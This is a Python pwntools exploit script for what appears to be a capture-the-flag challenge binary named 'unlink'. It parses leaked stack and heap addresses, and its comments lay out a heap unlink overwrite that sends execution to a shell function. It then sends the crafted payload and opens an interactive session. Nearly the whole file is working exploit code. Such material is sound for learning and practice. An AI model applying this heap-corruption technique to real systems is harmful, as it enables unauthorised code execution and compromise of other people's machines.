#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        conn = ssh(host=sys.argv[1], user=sys.argv[2], 
                   port=int(sys.argv[3]), password=sys.argv[4])
        return conn.process([exe] + argv, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b unlink
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './unlink'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

io = start()

# receive leaks for exploit
stack_leak = int(io.recvline().decode().split()[-1], 16)
heap_leak = int(io.recvline().decode().split()[-1], 16)
log.info(f"Stack leak: {hex(stack_leak)}")
log.info(f"Heap leak: {hex(heap_leak)}")
io.recvline()

# $ebp offset = 20

#        -- HEAP LAYOUT AFTER OVERWRITE  --
# BK = *(B_NODE + 4) ~ points to the following layout
# FD = *(B_NODE)     ~ ""
#
#             | FD      |   | BK (located on stack)|
#  shell addr | garbage |   | FD addr              |
#
#                -- EXPLOIT LOGIC --
#
#    *(FD + 4) = BK      ~ *garbage = stack addr
#    *(BK) = FD          ~ *(stack_target) = fd addr
#
#    later... 0x8048603
#    ebp = *stack_target ~ ebp = shell addr

# Nodes are using 0x20 size chunks
OFFSET_TO_B_NODE = 0x20 - (4 + 4)   # where to overwrite fd and bk
TARGET_ADDR = stack_leak + 20       # future $ebp stack address 
ADDR_TO_FD = heap_leak + 0x20 + 12  # address on the heap
ADDR_TO_BK = TARGET_ADDR - 4        # address on the stack
SHELL_ADDR = 0x080484eb             # shell address

payload = flat(
    p32(SHELL_ADDR),
    b'A' * 12,
    p32(stack_leak + 12),
    p32(heap_leak + 12),
)

# Send the payload
io.sendline(payload)

# Receive the flag
io.interactive()
